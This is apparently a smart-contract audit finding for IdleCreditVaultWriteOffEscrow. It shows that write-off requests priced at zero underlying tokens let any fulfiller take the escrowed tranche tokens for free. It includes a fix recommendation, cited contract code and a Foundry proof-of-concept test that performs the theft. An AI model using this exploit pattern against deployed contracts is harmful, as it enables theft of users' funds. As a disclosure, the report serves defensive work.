### Title

Zero-priced write-off requests allow theft of escrowed tranches - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary

`createWriteOffRequest()` validates that the escrowed tranche amount is nonzero but does not validate `underlyingsRequested`. A lender can therefore create a request asking for zero underlying tokens, and any fulfiller can complete that request for free while receiving all escrowed tranche tokens.

### Finding Description

The external issue is a missing required request field under a supported mode. The closest in-scope analog is `IdleCreditVaultWriteOffEscrow.createWriteOffRequest()`, where the required purchase amount is never required to be nonzero. The function stores `underlyingsRequested` directly and escrows the lender's tranches once `amount != 0`. [1](#0-0) 

`fullfillWriteOffRequest()` only rejects an underlying payment below `currentRequest.underlyings`. If that value is zero, passing `_underlyings = 0` satisfies the check, computes a zero exit fee, pays the lender nothing, and transfers the escrowed tranches to the fulfiller. [2](#0-1) 

### Impact Explanation

An unprivileged fulfiller can steal the full tranche balance escrowed in any zero-priced write-off request. The loss equals the victim's `currentRequest.tranches`; neither borrower, manager, nor owner involvement is required.

### Likelihood Explanation

Exploitation requires a lender to create a request with `underlyingsRequested == 0`, either through a malformed frontend call, integration bug, or accidental input. That is a realistic transaction-parameter failure, and once the request exists the theft is permissionless and atomic.

### Recommendation

Reject zero-priced write-off requests in `createWriteOffRequest()` by adding `if (underlyingsRequested == 0) revert NotAllowed();`. For defense in depth, `fullfillWriteOffRequest()` can also reject requests whose stored `underlyings` is zero.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/IdleCreditVaultWriteOffEscrow.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";

contract WriteOffEscrowZeroPricePoC is Test {
    // Assumes the existing fixture/deployed contracts used by
    // test/foundry/IdleCreditVaultWriteOffEscrow.t.sol.
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20Detailed tranche;

    address victim = address(0x1001);
    address attacker = address(0x2002);

    function testAttackerStealsZeroPricedRequest() public {
        uint256 tranches = 100e18;

        // Epoch is running and victim approved the escrow to pull tranches.
        vm.prank(victim);
        escrow.createWriteOffRequest(tranches, 0);

        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(victim, tranches, 0);

        assertEq(tranche.balanceOf(attacker), tranches);
        assertEq(tranche.balanceOf(victim), 0);
    }
}
```

The test requires only a running epoch, a victim tranche approval, and a zero `underlyingsRequested`; the attacker needs no underlying balance or approval because a zero-token transfer succeeds.

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L123-151)
```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
